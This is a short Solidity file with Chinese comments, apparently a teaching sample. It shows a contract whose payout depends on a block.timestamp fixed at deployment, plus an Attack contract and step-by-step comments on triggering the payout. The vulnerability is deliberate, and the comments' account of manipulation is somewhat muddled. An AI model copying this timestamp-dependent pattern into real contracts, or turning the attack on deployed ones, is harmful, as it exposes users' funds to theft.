pragma solidity >=0.8.0;

// 此合約存在漏洞：Incorrect Use of Event Blockchain variables for Time
// 攻擊者或礦工可利用部署時即固定的 block.timestamp 來操控 pay() 函式的行為

contract Test {
    // 漏洞重點: 在合約部署時就固定了 block.timestamp 的值，日後不再更新
    uint public time = block.timestamp;

    // 函式 pay: 當 time 為奇數時，傳送 100 wei 給呼叫者
    // 漏洞重點: 此處依賴的是部署時固定的時間，而非每次執行時的區塊時間，
    //           使得合約行為取決於一個容易被外部操控的資訊
    function pay() public payable {
        if (time % 2 == 1) {
            // 注意: 使用 transfer/ send 傳送固定金額，僅作示範用途
            payable(msg.sender).transfer(100);
        }
    }
}

// 攻擊合約示例：
// 攻擊流程說明：
// 1. 攻擊者部署 Test 合約（或利用已部署的 Test 合約）。
// 2. 攻擊者確認該合約部署時的 block.timestamp 為奇數（可藉由查詢 Test.time 變數得知）。
// 3. 攻擊者透過呼叫 attack() 函式來觸發 Test.pay()，使攻擊者得以取得 100 wei。

contract Attack {
    Test public target;

    // 在部署 Attack 合約時，傳入目標合約 Test 的位址
    constructor(address _target) {
        target = Test(_target);
    }

    // 攻擊者呼叫此函式來利用漏洞
    function attack() public payable {
        // 若部署時的 timestamp 為奇數，則 Test.pay() 的條件成立
        target.pay{value: msg.value}();
    }

    // 接收來自目標合約轉出的 Ether
    receive() external payable {}
}
